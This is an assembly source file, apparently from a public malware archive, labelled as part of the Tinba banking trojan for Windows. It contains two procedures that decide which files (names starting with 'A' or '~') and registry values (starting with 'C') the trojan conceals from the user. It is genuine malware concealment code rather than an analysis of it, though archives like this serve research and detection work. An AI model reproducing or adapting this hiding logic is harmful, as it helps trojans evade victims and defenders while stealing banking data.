; ------------------------------------------------------------
; name      Tinba
; type      trojan
; cve       —
; year      unknown
; os        Windows
; authors   unknown
; source    RamadhanAmizudin/malware
; archived  RamadhanAmizudin, krisyotam (2026)
; notes     —
; ------------------------------------------------------------

.code

;; -------------------------------------------------------------------------------- ;;
IsHiddenFile proc

	cmp byte ptr [ebx], "A"
	je @hide
	cmp byte ptr [ebx], "~"
	je @hide

;; Not hide
	xor ebx, ebx
	ret

@hide:
	ret
IsHiddenFile endp


;; -------------------------------------------------------------------------------- ;;
IsHiddenRegValue proc

	cmp byte ptr [ebx], "C"
	je @hide

;; Not hide
	xor ebx, ebx
	ret

@hide:
	ret
IsHiddenRegValue endp

